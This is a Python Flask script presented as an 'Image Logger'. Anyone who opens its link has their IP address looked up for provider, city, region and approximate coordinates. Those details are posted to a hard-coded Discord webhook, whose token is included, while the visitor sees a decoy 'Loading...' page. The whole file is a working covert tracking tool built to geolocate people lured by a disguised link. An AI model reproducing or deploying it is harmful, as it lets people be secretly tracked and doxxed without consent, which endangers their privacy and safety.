from flask import Flask, request, Response
import requests
import json

app = Flask(__name__)

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1334828086344028241/5kkf6uFQ-7uIwrYKftpappfJ9c7MrjaJQxb8Tg7s4ZFqGS5u74DMaCdMPRcHw50TH3pq'

def send_to_discord(info):
    data = {
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "description": "A User Opened the Original Image!",
                "color": 3447003,  # Blue color
                "fields": [
                    {"name": "IP Info", "value": info}
                ]
            }
        ]
    }
    headers = {"Content-Type": "application/json"}
    response = requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(data), headers=headers)
    print("Discord response status:", response.status_code)
    print("Discord response body:", response.text)
    if response.status_code != 204:
        print("Error sending to Discord:", response.text)

@app.route('/')
def log_ip_info():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip == '127.0.0.1':
        ip = requests.get('https://api.ipify.org').text  # Fallback to external service

    print("IP Address:", ip)

    try:
        response = requests.get(f'https://ipinfo.io/{ip}/json')
        response.raise_for_status()
        data = response.json()

        info = f"""
        IP: {data.get('ip', 'N/A')}
        Provider: {data.get('org', 'N/A')}
        ASN: {data.get('org', 'N/A')}
        Country: {data.get('country', 'N/A')}
        Region: {data.get('region', 'N/A')}
        City: {data.get('city', 'N/A')}
        Coords: {data.get('loc', 'N/A')} (Approximate)
        Timezone: {data.get('timezone', 'N/A')}
        Mobile: False
        VPN: False
        Bot: False
        """

        print("IP Info:", info)
        send_to_discord(info)

    except requests.exceptions.RequestException as e:
        print("Error retrieving IP information:", e)
        info = f"Error retrieving IP information: {e}"
        send_to_discord(info)

    # Infinite loading response
    return Response("<html><head><title>Loading...</title><body><h1>Loading...</h1></body></html>", status=200, content_type='text/html')

if __name__ == '__main__':
    app.run(debug=True)
